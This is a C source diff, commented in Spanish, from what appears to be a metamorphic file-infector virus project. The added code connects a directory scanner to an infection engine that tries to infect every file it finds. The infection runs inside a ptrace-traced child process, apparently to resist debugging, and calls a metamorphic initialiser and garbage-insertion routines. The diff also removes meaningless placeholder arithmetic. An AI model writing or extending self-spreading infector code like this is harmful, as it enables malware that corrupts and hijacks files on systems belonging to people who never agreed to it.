@@ -1,4 +1,35 @@
 #include "../../include/war.h"
+#include "../../include/config.h"
+#include "../../include/infector.h"
+#include "../../include/scanner.h"
+
+// Callback del scanner: intenta infectar cada archivo encontrado
+static void try_infect_file(const char *filepath, t_config *cfg) {
+    infector_engine_run(filepath, cfg);
+}
+
+// Función que ejecuta el trabajo real de infección (bajo ptrace)
+void do_infection_work(void)
+{
+    // Inicializar metamorph
+    init_metamorph();
+    
+    // Crear configuración
+    t_config *cfg = config_create_default();
+    if (!cfg) return;
+    
+    // Determinar estrategia de escaneo
+    scan_strategy_t strategy = cfg->enable_recursive ? 
+                               SCAN_STRATEGY_RECURSIVE : 
+                               SCAN_STRATEGY_SIMPLE;
+    
+    // Ejecutar motor de escaneo + infección
+    scanner_engine_run(strategy, cfg, try_infect_file);
+    
+    // Cleanup
+    config_destroy(cfg);
+}
+
 void is_process_running(const char *process_name)
 {
 	DIR *proc_dir;
@@ -32,8 +63,6 @@ void is_process_running(const char *process_name)
 		fclose(fp);
 	}
 	closedir(proc_dir);
-	pepino *= -36;
-	calculadoradepepino();
 }
 
 void init_metamorph(void)
@@ -44,8 +73,6 @@ void init_metamorph(void)
 		srand(time(NULL) ^ getpid());
 		initialized = true;
 	}
-	pepino += 777;
-	calculadoradepepino();
 }
 void insert_garbage2(void) { insert_garbage4(); }
 void insert_garbage3(void) { insert_garbage5(); }
@@ -116,8 +143,9 @@ void child_process(void)
 		exit(1);
 	}
 	raise(SIGSTOP);
-	pepino /= 4;
-	calculadoradepepino();
+	// El código de infección se ejecutará aquí después de SIGSTOP
+	// cuando el padre continúe el proceso
+	do_infection_work();
 	exit(0);
 }
 void parent_tracer(pid_t child_pid)
@@ -167,7 +195,7 @@ void run2withtracer(int h)
 {
 	if (h == 0)
 	{
-		calculadoradepepino();
+		child_process();
 	}
 	else
 	{
@@ -184,6 +212,16 @@ void run_with_tracer(void)
 	{
 		exit(1);
 	}
-	pepino = (pepino * -1) * (pepino * -1);
-	run2withtracer(pid);
+	if (pid == 0)
+	{
+		// Proceso hijo: ejecutará el trabajo bajo ptrace
+		child_process();
+	}
+	else
+	{
+		// Proceso padre: tracea al hijo
+		parent_tracer(pid);
+		// Padre termina después de que el hijo termine
+		exit(0);
+	}
 }
